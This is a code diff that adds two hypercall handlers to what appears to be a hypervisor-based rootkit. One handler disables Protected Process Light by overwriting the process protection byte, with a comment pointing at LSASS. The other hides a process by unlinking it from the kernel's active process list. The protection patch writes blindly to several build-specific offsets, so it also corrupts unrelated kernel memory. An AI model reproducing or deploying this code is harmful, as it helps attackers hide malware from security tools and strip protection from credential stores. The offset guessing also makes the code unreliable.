@@ -479,6 +479,92 @@ void hypercall::process(const hypercall_info_t hypercall_info, trap_frame_t* con
 
         break;
     }
+    case hypercall_type_t::_hc_0x250:
+    {
+        // Toggle Process Protection (PPL Bypass)
+        // RDX = EPROCESS Address (GVA), R8 = 0 (Off) or 1 (On)
+        const std::uint64_t eprocess_va = trap_frame->rdx;
+        const bool enable = (trap_frame->r8 != 0);
+
+        if (eprocess_va == 0) { trap_frame->rax = 0; break; }
+
+        const cr3 guest_cr3 = { .flags = authorized_caller_cr3 };
+        const cr3 slat_cr3 = slat::hyperv_cr3();
+
+        // Offsets for Protection (Win 10/11 common)
+        // 0x87A for Win 11, 0x6AA for Win 10. We will flip both to be safe.
+        std::uint64_t offsets[] = { 0x6AA, 0x87A, 0x58A }; // Broad coverage
+
+        for (auto offset : offsets) {
+            std::uint64_t addr = eprocess_va + offset;
+            std::uint64_t pa = memory_manager::translate_guest_virtual_address(guest_cr3, slat_cr3, { .address = addr });
+            if (pa != 0) {
+                std::uint8_t* mapped = static_cast<std::uint8_t*>(memory_manager::map_host_physical(pa));
+                if (mapped) {
+                    // Protection: bit 0:3 = Type, bit 4:7 = Audit
+                    // We zero it to disable PPL (0 = None)
+                    // We restore it to 0x31 (PPL-WinSystem) if enabling (common for LSASS)
+                    *mapped = enable ? 0x31 : 0x00;
+                }
+            }
+        }
+        
+        trap_frame->rax = 1; 
+        break;
+    }
+    case hypercall_type_t::_hc_0x260:
+    {
+        // DKOM: Unlink process from ActiveProcessLinks
+        // RDX = EPROCESS Address (GVA)
+        // ActiveProcessLinks offset = 0x448 (verified in usermode code)
+        const std::uint64_t eprocess_va = trap_frame->rdx;
+        if (eprocess_va == 0) { trap_frame->rax = 0; break; }
+
+        const cr3 guest_cr3 = { .flags = authorized_caller_cr3 };
+        const cr3 slat_cr3 = slat::hyperv_cr3();
+
+        constexpr std::uint64_t apl_offset = 0x448; // ActiveProcessLinks
+
+        // Read our Flink and Blink
+        std::uint64_t our_flink = 0, our_blink = 0;
+        std::uint64_t flink_pa = memory_manager::translate_guest_virtual_address(guest_cr3, slat_cr3, { .address = eprocess_va + apl_offset });
+        std::uint64_t blink_pa = memory_manager::translate_guest_virtual_address(guest_cr3, slat_cr3, { .address = eprocess_va + apl_offset + 8 });
+
+        if (flink_pa == 0 || blink_pa == 0) { trap_frame->rax = 0; break; }
+
+        auto* flink_mapped = static_cast<std::uint64_t*>(memory_manager::map_host_physical(flink_pa));
+        auto* blink_mapped = static_cast<std::uint64_t*>(memory_manager::map_host_physical(blink_pa));
+
+        if (!flink_mapped || !blink_mapped) { trap_frame->rax = 0; break; }
+
+        our_flink = *flink_mapped;
+        our_blink = *blink_mapped;
+
+        if (our_flink == 0 || our_blink == 0) { trap_frame->rax = 0; break; }
+
+        // Patch previous->Flink = our_flink
+        // previous is at (our_blink - 0) since Flink is first member of LIST_ENTRY
+        std::uint64_t prev_flink_pa = memory_manager::translate_guest_virtual_address(guest_cr3, slat_cr3, { .address = our_blink });
+        if (prev_flink_pa != 0) {
+            auto* prev_flink = static_cast<std::uint64_t*>(memory_manager::map_host_physical(prev_flink_pa));
+            if (prev_flink) *prev_flink = our_flink;
+        }
+
+        // Patch next->Blink = our_blink
+        // next is at (our_flink + 8) since Blink is second member of LIST_ENTRY
+        std::uint64_t next_blink_pa = memory_manager::translate_guest_virtual_address(guest_cr3, slat_cr3, { .address = our_flink + 8 });
+        if (next_blink_pa != 0) {
+            auto* next_blink = static_cast<std::uint64_t*>(memory_manager::map_host_physical(next_blink_pa));
+            if (next_blink) *next_blink = our_blink;
+        }
+
+        // Point ourselves to ourselves (safe self-loop)
+        *flink_mapped = eprocess_va + apl_offset;
+        *blink_mapped = eprocess_va + apl_offset;
+
+        trap_frame->rax = 1;
+        break;
+    }
     default:
         break;
     }
